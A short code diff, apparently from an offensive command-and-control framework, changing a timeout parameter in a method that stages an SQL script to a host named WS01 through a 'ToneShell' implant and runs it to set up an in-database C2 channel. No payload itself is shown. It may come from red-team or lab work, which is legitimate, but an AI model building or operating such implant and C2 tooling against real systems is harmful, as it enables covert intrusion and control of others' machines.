@@ -13,8 +13,10 @@ _PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
 class XpAgentMixin:
     """In-DB C2 channel via xpagent Service Broker queue on IIS01."""
 
-    def cmd_xpagent_init(self, shell, timeout_s: int = 60):
-        """Stage xpagent_init.sql to WS01 as xpagent_init.stl via ToneShell FILE_DOWNLOAD and run via sqlcmd -i."""
+    def cmd_xpagent_init(self, shell, timeout_s: int = None):
+        """Stage xpagent_init.sql to WS01 as xpagent_init.stl via ToneShell FILE_DOWNLOAD and run via sqlcmd -i.
+
+        timeout_s (optional): implant wait-limit override (None = operator `timeout <n>`)."""
         src = os.path.join(_SQL_DIR, "xpagent_init.sql")
         dst = os.path.join(_PAYLOADS_DIR, "xpagent_init.sql")
         try:
